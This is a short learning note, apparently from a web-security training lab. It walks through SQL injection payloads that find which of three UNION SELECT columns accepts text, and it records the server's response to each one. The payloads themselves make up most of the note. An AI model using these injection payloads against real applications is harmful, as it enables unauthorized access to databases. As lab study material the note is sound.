# Learning Notes

## Topic

Finding a Column Containing Text

---

## Goal

Determine which UNION SELECT column accepts string values.

---

## Known Information

Previous lab identified:

```
3 Columns
```

---

## Target String

```
YUz0R9
```

---

## Step 1

Test first column.

Payload

```sql
' UNION SELECT 'abcd',NULL,NULL--
```

Result

```
500 Internal Server Error
```

First column rejects text.

---

## Step 2

Test second column.

Payload

```sql
' UNION SELECT NULL,'abcd',NULL--
```

Result

```
200 OK
```

Second column accepts text.

---

## Step 3

Replace with required string.

```sql
' UNION SELECT NULL,'YUz0R9',NULL--
```

Result

```
HTTP/2 200 OK
```

Random string displayed successfully.

---

## Conclusion

- Total Columns = 3
- Text-Compatible Column = 2

---

## Skills Learned

- UNION SELECT
- Data Type Identification
- String Enumeration
- Burp Repeater
- SQL Injection Analysis